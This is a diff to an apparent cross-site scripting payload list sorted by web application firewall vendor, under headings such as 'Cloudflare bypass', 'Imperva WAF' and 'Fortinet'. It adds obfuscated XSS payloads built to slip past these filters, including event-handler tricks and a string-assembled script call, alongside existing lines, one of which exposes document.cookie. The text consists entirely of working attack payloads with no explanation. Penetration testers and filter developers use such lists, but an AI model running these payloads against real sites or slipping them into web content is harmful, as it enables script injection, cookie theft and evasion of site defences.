@@ -9,6 +9,7 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<
 <img+border%3d3+alt%3djaVasCript%3a%2f*-%2f*%60%2f*%5c%60%2f*%26%23039%3b%2f*%26quot%3b%2f**%2f(%2f*+*%2foNcliCk%3dalert()+)%2f%2f%250D%250A%250d%250a%2f%2f%26lt%3b%2fstYle%2f%26lt%3b%
 2ftitLe%2f%26lt%3b%2fteXtarEa%2f%26lt%3b%2fscRipt%2f--!%26gt%3b%5cx3csVg%2f%26lt%3bsVg%2foNloAd%3dconfirm(%27XSS%27)%2f%2f%26gt%3b%5cx3e>
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(document.domain)" />click
+"/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto⁣
 
 ##Cloudflare bypass:
 javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
@@ -28,3 +29,9 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 
 ##Imperva WAF:
 %22%3EEnter_Mouse_Pointer_Here_to_get_XSS%3C%5K/onpointerenter​=alert(location)%3E%3!–
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+
+##Fortinet:
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+
+
